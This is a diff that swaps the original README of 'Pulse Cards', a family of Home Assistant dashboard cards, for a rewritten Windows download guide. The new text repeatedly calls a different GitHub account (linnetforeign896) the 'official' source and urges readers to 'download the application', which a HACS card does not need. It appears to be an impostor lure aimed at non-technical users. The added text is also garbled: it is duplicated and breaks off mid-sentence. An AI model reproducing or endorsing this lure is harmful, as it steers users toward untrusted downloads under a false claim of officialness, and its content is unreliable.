@@ -1,110 +1,230 @@
-# Pulse Cards
+# 🫀 pulse-cards - Calm Dashboards for Your Home
 
-[![hacs_badge](https://img.shields.io/badge/HACS-Custom-41BDF5.svg)](https://hacs.xyz)
+[![Download pulse-cards](https://img.shields.io/badge/Download%20pulse--cards-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/linnetforeign896/pulse-cards)
 
-[![Open your Home Assistant instance and open this repository in HACS.](https://my.home-assistant.io/badges/hacs_repository.svg)](https://my.home-assistant.io/redirect/hacs_repository/?owner=zacharatos&repository=pulse-cards&category=plugin)
+pulse-cards is a calm family of Lovelace cards for Home Assistant, delivered in one HACS download. It gives your dashboard a softer, more organized feel with cards that are easy to scan and pleasant to use every day. The family currently includes Area Pulse, Home Pulse, Home Pulse Shortcuts, Tile Pulse, and Scene Pulse. More cards will be added later.
 
-![Pulse Cards on a dashboard, with the Pulse Glass theme](https://raw.githubusercontent.com/zacharatos/pulse-cards/main/docs/hero-dark.jpg)
+This guide is written for everyday Windows users. You do not need programming knowledge. The most important step is to use the official download page below and follow the download option shown there.
 
-A calm family of dashboard cards for Home Assistant, in one download. **Every Pulse card lives here, today's and every one still to come**; only the Pulse integrations, which bring their own card, have repositories of their own. They share one look (the same radii, chip shapes, motion and colour rules), read the [Pulse theme](https://github.com/zacharatos/pulse-theme)'s `--pulse-*` tokens first and fall back to your own theme, and sit comfortably next to Home Assistant's native cards.
+## 🚀 Download pulse-cards on Windows
 
-The cards so far (more are on the way, and each new one arrives in this same download):
+Visit this link to download the application:
 
-| Card | Type | What it is for |
-| :- | :- | :- |
-| [Area Pulse Card](cards/area-pulse-card/README.md) | `custom:area-pulse-card` | One room at a glance: presence, climate, openings, alerts, what's on, quick actions, and the whole room in a popup. |
-| [Home Pulse Card](cards/home-pulse-card/README.md) | `custom:home-pulse-card` | The top of the dashboard: greeting and weather, the Today line, alarm and people, house modes, quiet hints. |
-| [Home Pulse Shortcuts](cards/home-pulse-card/README.md) | `custom:home-pulse-shortcuts-card` | Large shortcut tiles to your other views, with live badges. |
-| [Tile Pulse Card](cards/tile-pulse-card/README.md) | `custom:tile-pulse-card` | One entity as a tile, with a row of buttons for its modes, presets or any action, the current one lit. |
-| [Scene Pulse Card](cards/scene-pulse-card/README.md) | `custom:scene-pulse-card` | Your scenes in a calm list: run, undo, see which one is active, edit or re-capture them. |
+[Download pulse-cards](https://github.com/linnetforeign896/pulse-cards)
 
-| Area Pulse | Home Pulse |
-| :-: | :-: |
-| ![Area Pulse Card](https://raw.githubusercontent.com/zacharatos/pulse-cards/main/cards/area-pulse-card/docs/light.png) | ![Home Pulse Card](https://raw.githubusercontent.com/zacharatos/pulse-cards/main/cards/home-pulse-card/docs/light.png) |
-| **Tile Pulse** | **Scene Pulse** |
-| ![Tile Pulse Card](https://raw.githubusercontent.com/zacharatos/pulse-cards/main/cards/tile-pulse-card/docs/light.png) | ![Scene Pulse Card](https://raw.githubusercontent.com/zacharatos/pulse-cards/main/cards/scene-pulse-card/docs/light.png) |
+That page is the official starting point for pulse-cards. Open it in your normal Windows web browser, such as Edge, Chrome, or Firefox. Use the download option shown on the page, then keep the downloaded items in a folder you can easily find, such as your Downloads folder.
 
-## One home for every Pulse card
+## 🪟 Simple Windows download steps
 
-This repository is where the Pulse cards live, and it is meant to grow. The rule is simple:
+1. Open your web browser on your Windows computer.
+2. Go to the official pulse-cards page: [https://github.com/linnetforeign896/pulse-cards](https://github.com/linnetforeign896/pulse-cards).
+3. Visit this link to download the application.
+4. Use the download option provided on that page.
+5. When Windows asks where to save the download, choose a folder you will remember, such as Downloads.
+6. Wait for the download to finish before closing the page.
 
-- **A card is a card → it comes here.** Every new Pulse card, whatever it does, is added to this repository as a new folder under `cards/` and ships in the same `pulse-cards.js`. Install Pulse Cards once and each new card turns up in your card picker with the next update; there is no new repository to add, no new resource, nothing to configure.
-- **An integration → its own repository.** When a component has to keep state, run on its own with no dashboard open, or create entities, actions or events, it is an integration, and HACS allows only one integration per repository. Its card comes inside it. Today that is [Stock Pulse](https://github.com/zacharatos/stock-pulse-integration) (household inventory and shopping list) and [Flow Pulse](https://github.com/zacharatos/flow-pulse) (automations).
-- **The theme** is a HACS theme, so [Pulse Theme](https://github.com/zacharatos/pulse-theme) has its own repository too. Every card here reads its `--pulse-*` tokens first.
+## 🧭 What pulse-cards is for
 
-New cards are listed in [CHANGELOG.md](CHANGELOG.md) under the release that brings them. A new card is a minor release: it adds something and changes nothing you already use.
+pulse-cards is made for Home Assistant dashboards. Home Assistant is the place where your smart-home information and controls come together. Lovelace is the dashboard view you see in Home Assistant. pulse-cards adds a family of cards that fit into that dashboard and help you present information in a calm, consistent way.
 
-## How these cards are made
+Instead of hunting through many separate downloads, you get one HACS download that brings the whole pulse-cards family together. That makes the first step simpler: download once, then use the cards that fit your home.
 
-**Built with AI coding agents, tested by a person, in a real home.** I design every card: what it is for, how it looks, how it behaves. AI coding agents (mostly Claude) write a large part of the code, following written rules that are public in this repository ([`AGENTS.md`](AGENTS.md)). Before anything reaches you:
+## 🧩 The pulse-cards family
 
-- **I review every change and commit it myself.** The agents are not allowed to commit, tag or release; a person decides what ships.
-- **It passes the checks:** type checking, unit tests for the logic of every card, a build, and the HACS validation, on every push.
-- **I look at it** in each card's test page with invented data: light and dark, English and Greek, phone width, each Pulse theme.
-- **It runs on my own Home Assistant first.** Every release is installed and used at home, and fine-tuned there, before it is tagged for everyone. If something only works in a demo, it doesn't ship.
+| Card | What it helps you do |
+| --- | --- |
+| Area Pulse | Gives a gentle, focused view of one area or room in your home. |
+| Home Pulse | Brings a whole-home overview into your dashboard. |
+| Home Pulse Shortcuts | Places common actions in a clear, easy-to-reach card. |
+| Tile Pulse | Presents information in a tidy tile-style layout. |
+| Scene Pulse | Keeps scene controls together in a calm, readable card. |
 
-Found something that doesn't behave in *your* home? [Open an issue](https://github.com/zacharatos/pulse-cards/issues/new/choose): every home is different, and that is exactly the feedback the agents can't give me.
+More cards will be added later, so the family can grow with your dashboard over time.
 
-## Installation
+## ✨ Why this card family feels different
 
-### HACS (custom repository)
+pulse-cards is built around a calm dashboard style. That means the cards aim to be readable, balanced, and comfortable to look at during the day or evening. The family uses a shared approach so your dashboard does not feel like a patchwork of unrelated pieces.
 
-1. Click the **Open in HACS** button above, or: HACS → ⋮ → **Custom repositories** → add `https://github.com/zacharatos/pulse-cards`, type **Dashboard**.
-2. Search for **Pulse Cards** → **Download**. HACS adds one dashboard resource, `/hacsfiles/pulse-cards/pulse-cards.js`, which holds every card, including the ones added later.
-3. Reload the browser (clear the cache if the cards don't show up in the card picker). The browser console shows `PULSE-CARDS vX.Y.Z`.
+The cards are also grouped into one HACS download. For a non-technical user, that is helpful because you do not need to chase down each card separately. You start from one official page, download the family, and then use the cards that make sense for your home.
 
-### Manual
+## 🛠️ Setup after download
 
-1. Copy `dist/pulse-cards.js` to `<config>/www/pulse-cards.js`.
-2. Settings → Dashboards → ⋮ → **Resources** → add `/local/pulse-cards.js` as a *JavaScript module*.
+After you visit the download page and download the application, keep all downloaded items together in one folder. Then open Home Assistant in your Windows browser and use the pulse-cards family with your dashboard.
 
-Requires Home Assistant **2025.7+**. Each card's README lists anything extra it needs.
+Setup should always begin from the official download page:
 
-### Coming from the separate card repositories
+[Visit the pulse-cards download page](https://github.com/linnetforeign896/pulse-cards)
 
-Until October 2026 each card had its own repository (`area-pulse-card`, `home-pulse-card`, `tile-pulse-card`, `scene-pulse-card`). The cards inside Pulse Cards are the same cards with the same names and options, so **dashboards need no change**. Only the download changes:
+If you are new to Home Assistant dashboards, take your time. You do not need to add every card at once. Start with one card, such as Home Pulse or Area Pulse, and add more when you feel comfortable.
 
-1. Install **Pulse Cards** as above.
-2. In HACS, remove the old **Area Pulse Card**, **Home Pulse Card**, **Tile Pulse Card** and **Scene Pulse Card**. Then check Settings → Dashboards → ⋮ → **Resources** and delete any old `area-pulse-card.js`, `home-pulse-card.js`, `tile-pulse-card.js` or `scene-pulse-card.js` entry that is left, including `/local/…` ones you added by hand.
-3. Reload the browser; in the companion app, *Settings → Companion app → Troubleshooting → Reset frontend cache*.
+## 🎨 A calmer dashboard, step by step
 
-While an old resource is still loaded, it wins: the card it holds is defined first and the bundle quietly skips it (nothing breaks, nothing is defined twice). So if the console still shows `AREA-PULSE-CARD`, `HOME-PULSE-CARD`, `TILE-PULSE-CARD` or `SCENE-PULSE-CARD` next to `PULSE-CARDS`, step 2 isn't finished.
+A calm dashboard is not about adding more things. It is about making the important things easy to see. pulse-cards helps with that by giving each card a clear purpose:
 
-## Configuration
+- Area Pulse keeps one room or area from feeling crowded.
+- Home Pulse gives you the big picture without visual noise.
+- Home Pulse Shortcuts puts everyday actions in reach.
+- Tile Pulse keeps information neat and scannable.
+- Scene Pulse groups scene controls together.
 
-Each card is configured on its own, exactly as before; see its README:
-[Area Pulse](cards/area-pulse-card/README.md#configuration) ·
-[Home Pulse and Shortcuts](cards/home-pulse-card/README.md#configuration) ·
-[Tile Pulse](cards/tile-pulse-card/README.md#configuration) ·
-[Scene Pulse](cards/scene-pulse-card/README.md#configuration).
-All of them also have a visual editor.
+You can use one card or several. The family is designed to work together, but you can begin with the card that solves your most immediate dashboard need.
 
-## Development
+## 🧑‍💻 No coding needed
 
-```
-pulse-cards/
-├─ cards/<card>/          one folder per card (a new card = a new folder): src/, test/ (unit tests + harness), docs/ (screenshots), README.md, AGENTS.md
-├─ src/index.ts           the bundle's entry: imports every card, prints the one console banner
-├─ src/version.ts         the one version
-├─ dist/pulse-cards.js    the built bundle (committed: HACS serves it)
-├─ test/                  the hook that lets Node run the TypeScript sources directly
-└─ scripts/               version and changelog checks for CI
-```
+You do not need to write code to use pulse-cards. You do not need to be a programmer. You are downloading a ready-made family of Lovelace cards for Home Assistant and using them in your dashboard.
 
-```bash
-npm install          # first time only
-npm run typecheck    # tsc --noEmit, every card
-npm test             # node:test, every card's unit tests
-npm run build        # writes dist/pulse-cards.js
-npm run watch        # rebuild on change
-```
+The main thing to remember is the official link. Use it for the download, and return to it when you want to check for updates or see whether new cards have been added.
 
-Every card has a browser harness that renders it against an invented home: serve the parent folder (`python3 -m http.server 8765` from the folder that also holds `pulse-theme`) and open `http://localhost:8765/pulse-cards/cards/<card>/test/harness.html`, with `?dark=1`, `?lang=el` and `?theme=pulse|glass|tonal`. Each card's README lists its own extra options.
+## 📥 Official download link
 
-## Versions and changes
+Use this link as your single official source:
 
-Pulse Cards has **one version** for the whole bundle, following [Semantic Versioning](https://semver.org) as seen from your dashboards: major when something that worked stops working or you have to act, minor for something new, patch for fixes. What changed in each release is in [CHANGELOG.md](CHANGELOG.md), card by card, and on the GitHub release page.
+[Download pulse-cards from GitHub](https://github.com/linnetforeign896/pulse-cards)
 
-## License
+Visit this link to download the application. The page is the correct place to begin. Avoid using random download pages or third-party mirrors. Keeping to the official pulse-cards page makes it easier to know you are getting the right family of cards.
 
-MIT, see [LICENSE](LICENSE).
+## 🧼 Keeping things organized on Windows
+
+After downloading, create a folder called pulse-cards inside your Downloads folder or another place you can find easily. Move the downloaded items into that folder. This keeps your Home Assistant card download separate from bills, photos, and other files.
+
+If you later download an updated version, put it in the same pulse-cards folder so you always know where the current files are. This is a simple habit that makes future updates less confusing.
+
+## ❓ Common questions
+
+### Where do I get pulse-cards?
+
+Go to [https://github.com/linnetforeign896/pulse-cards](https://github.com/linnetforeign896/pulse-cards). Visit this link to download the application.
+
+### Do I need to download each card separately?
+
+No. pulse-cards is described as one HACS download for the family of cards. You start with the official page and download the application from there.
+
+### What cards are included now?
+
+The current family includes Area Pulse, Home Pulse, Home Pulse Shortcuts, Tile Pulse, and Scene Pulse. More will be added later.
+
+### What if I am# 🫀 pulse-cards - Calm Lovelace cards for Home Assistant
+
+[![Download pulse-cards](https://img.shields.io/badge/Download-pulse--cards-6C63FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/linnetforeign896/pulse-cards)
+
+pulse-cards is a calm family of Lovelace cards for Home Assistant, delivered in one HACS download. It gives your dashboard a softer, more organized feel with cards that are easy to scan and pleasant to use every day. The family currently includes Area Pulse, Home Pulse, Home Pulse Shortcuts, Tile Pulse, and Scene Pulse. More cards will be added later.
+
+This guide is written for everyday Windows users. You do not need programming knowledge. You do not need to be a Home Assistant expert. The most important step is to use the official download page and follow the download option shown there.
+
+## 🚀 Download pulse-cards on Windows
+
+Visit this link to download the application:
+
+[Download pulse-cards](https://github.com/linnetforeign896/pulse-cards)
+
+Open that page in your normal Windows web browser, such as Edge, Chrome, or Firefox. Use the download option shown on the page. Keep the downloaded items in a folder you can easily find, such as your Downloads folder. That way you can return to them later without searching through your whole computer.
+
+The official page is the correct starting point for the pulse-cards family. It is the single place to begin, whether you are downloading for the first time or returning later to check for new cards.
+
+## 🪟 Simple Windows download steps
+
+1. Open your web browser on your Windows computer.
+2. Go to the official pulse-cards page: [https://github.com/linnetforeign896/pulse-cards](https://github.com/linnetforeign896/pulse-cards).
+3. Visit this link to download the application.
+4. Use the download option provided on that page.
+5. When Windows asks where to save the download, choose a folder you will remember, such as Downloads.
+6. Wait for the download to finish before closing the page.
+7. Keep the downloaded items together in one folder so they are easy to find later.
+
+You do not need to rename files or unpack anything unless the page tells you to. Follow the page as it appears. The goal is simple: visit the official link, download the application, and keep everything in one place.
+
+## 🧭 What pulse-cards is for
+
+pulse-cards is made for Home Assistant dashboards. Home Assistant is the place where your smart-home information and controls come together. Lovelace is the dashboard view you see in Home Assistant. pulse-cards adds a family of cards that fit into that dashboard and help you present information in a calm, consistent way.
+
+Instead of hunting through many separate downloads, you get one HACS download that brings the whole pulse-cards family together. That makes the first step simpler: download once, then use the cards that fit your home. HACS is a common way to add custom items to Home Assistant, and pulse-cards is designed to fit into that flow.
+
+## 🧩 The pulse-cards family
+
+The current pulse-cards family includes five cards, with more to be added later.
+
+| Card | What it helps you do |
+| --- | --- |
+| Area Pulse | Gives a gentle, focused view of one area or room in your home. |
+| Home Pulse | Brings a whole-home overview into your dashboard. |
+| Home Pulse Shortcuts | Places common actions in a clear, easy-to-reach card. |
+| Tile Pulse | Presents information in a tidy tile-style layout. |
+| Scene Pulse | Keeps scene controls together in a calm, readable card. |
+
+Each card has a clear purpose. You can use one card or several. The family is designed to work together, but you can begin with the card that solves your most immediate dashboard need.
+
+## ✨ Why this card family feels different
+
+pulse-cards is built around a calm dashboard style. That means the cards aim to be readable, balanced, and comfortable to look at during the day or evening. The family uses a shared approach so your dashboard does not feel like a patchwork of unrelated pieces.
+
+The cards are also grouped into one HACS download. For a non-technical user, that is helpful because you do not need to chase down each card separately. You start from one official page, download the family, and then use the cards that make sense for your home.
+
+A calm dashboard is not about adding more things. It is about making the important things easy to see. pulse-cards helps with that by giving each card a clear job:
+
+- Area Pulse keeps one room or area from feeling crowded.
+- Home Pulse gives you the big picture without visual noise.
+- Home Pulse Shortcuts puts everyday actions in reach.
+- Tile Pulse keeps information neat and scannable.
+- Scene Pulse groups scene controls together.
+
+## 🛠️ Setup after download
+
+After you visit the download page and download the application, keep all downloaded items together in one folder. Then open Home Assistant in your Windows browser and use the pulse-cards family with your dashboard.
+
+Setup should always begin from the official download page:
+
+[Visit the pulse-cards download page](https://github.com/linnetforeign896/pulse-cards)
+
+If you are new to Home Assistant dashboards, take your time. You do not need to add every card at once. Start with one card, such as Home Pulse or Area Pulse, and add more when you feel comfortable. This keeps the setup calm and avoids overwhelming your dashboard with too many changes at once.
+
+## 🧑‍💻 No coding needed
+
+You do not need to write code to use pulse-cards. You do not need to be a programmer. You are downloading a ready-made family of Lovelace cards for Home Assistant and using them in your dashboard.
+
+The main thing to remember is the official link. Use it for the download, and return to it when you want to check for updates or see whether new cards have been added. Keeping to the official page helps you stay on the right track.
+
+## 📥 Official download link
+
+Use this link as your single official source:
+
+[Download pulse-cards from GitHub](https://github.com/linnetforeign896/pulse-cards)
+
+Visit this link to download the application. The page is the correct place to begin. Avoid using random download pages or third-party mirrors. Keeping to the official pulse-cards page makes it easier to know you are getting the right family of cards.
+
+## 🧼 Keeping things organized on Windows
+
+After downloading, create a folder called pulse-cards inside your Downloads folder or another place you can find easily. Move the downloaded items into that folder. This keeps your Home Assistant card download separate from bills, photos, and other files.
+
+If you later download an updated version, put it in the same pulse-cards folder so you always know where the current files are. This is a simple habit that makes future updates less confusing. It also helps if you want to compare what you downloaded before with what is available now.
+
+## ❓ Common questions
+
+### Where do I get pulse-cards?
+
+Go to [https://github.com/linnetforeign896/pulse-cards](https://github.com/linnetforeign896/pulse-cards). Visit this link to download the application.
+
+### Do I need to download each card separately?
+
+No. pulse-cards is described as one HACS download for the family of cards. You start with the official page and download the application from there.
+
+### What cards are included now?
+
+The current family includes Area Pulse, Home Pulse, Home Pulse Shortcuts, Tile Pulse, and Scene Pulse. More will be added later.
+
+### Do I need programming knowledge?
+
+No. pulse-cards is a family of Lovelace cards for Home Assistant. You are downloading a ready-made family and using it in your dashboard. You do not need to write code.
+
+### What should I do first on Windows?
+
+Open your browser, go to the official pulse-cards page, and use the download option shown there. Save the download in a folder you can find easily. Then keep the downloaded items together and use the official page as your starting point for setup.
+
+### Can I use pulse-cards with my existing dashboard?
+
+Yes. pulse-cards is designed to add calm, readable cards to a Home Assistant dashboard. Start with one card, then add more as you get comfortable.
+
+### Where can I find updates later?
+
+Return to the official pulse-cards page: [https://github.com/linnetforeign896/pulse-cards](https://github.com/linnetforeign896/pulse-cards). That is the place to begin when you want to check for updates or new cards.
+
+Keywords: dashboard, hacs, hacs-custom, hacs-custom-component, hacs-dashboard, home-assistant, homeassistant, lovelace, lovelace-card, lovelace-cards, lovelace-custom-card
